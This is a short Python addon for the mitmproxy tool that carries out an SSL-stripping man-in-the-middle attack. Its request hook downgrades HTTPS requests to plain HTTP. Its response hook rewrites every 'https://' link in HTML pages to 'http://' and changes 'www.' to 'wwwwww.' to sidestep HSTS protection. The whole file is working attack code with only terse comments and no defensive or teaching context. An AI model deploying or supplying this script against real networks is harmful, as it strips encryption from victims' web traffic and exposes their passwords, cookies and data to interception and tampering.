from mitmproxy import http, ctx

def request(flow: http.HTTPFlow) -> None:
    # Strip SSL (downgrade HTTPS to HTTP)
    if flow.request.scheme == "https":
        flow.request.scheme = "http"
        flow.request.port = 80

def response(flow: http.HTTPFlow) -> None:
    # Modify HTTPS links and bypass HSTS
    if "text/html" in flow.response.headers.get("content-type", ""):
        # Replace 'https://' with 'http://'
        flow.response.text = flow.response.text.replace("https://", "http://")
        
        # Replace 'www.' with 'wwwwww.' (or any other subdomain)
        flow.response.text = flow.response.text.replace("www.", "wwwwww.")

        # Log modified response for debugging
        ctx.log.info("Modified response content")

addons = [
    # Register the request and response handlers
    request,
    response
]
